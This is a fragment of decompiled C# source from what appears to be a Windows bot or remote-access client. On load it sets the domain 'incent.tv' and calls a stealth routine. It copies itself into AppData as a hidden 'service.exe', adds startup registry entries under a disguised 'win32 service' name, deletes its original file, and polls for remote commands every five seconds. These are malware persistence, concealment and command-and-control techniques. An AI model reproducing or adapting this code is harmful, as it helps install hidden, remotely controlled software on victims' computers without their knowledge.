	private void aio_Load(object sender, EventArgs e)
	{
		if (!autocontrolled)
		{
			return;
		}
		domaint.set_Text("incent.tv");
		Button1.PerformClick();
		stealth();
		Timer1.set_Enabled(true);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string executablePath = Application.get_ExecutablePath();
		try
		{
			if (Operators.CompareString(folderPath, executablePath, false) != 0)
			{
				FileSystem.DeleteFile(folderPath + "\\service.exe");
				RemoveKey("win32 service");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (!FileSystem.FileExists(folderPath + "\\service.exe"))
		{
			FileSystem.CopyFile(executablePath, folderPath + "\\service.exe");
			File.SetAttributes(folderPath + "\\service.exe", FileAttributes.Hidden);
			AddStartup("win32 service", folderPath + "\\service.exe");
			AddStartup("whereitwas", executablePath);
			Process.Start(folderPath + "\\service.exe");
			((Form)this).Close();
		}
		try
		{
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(ReadKey("whereitwas"), (object)"", false))))
			{
				FileSystem.DeleteFile(Conversions.ToString(ReadKey("whereitwas")));
				RemoveKey("whereitwas");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (Timer1.get_Interval() == 1)
		{
			Timer1.set_Interval(5000);
		}
		if (taskid == 0)
		{
			docommand();
		}
	}

	private void wd_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.wd).Show();
	}

	private void ctb_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.ct).Show();
	}
}
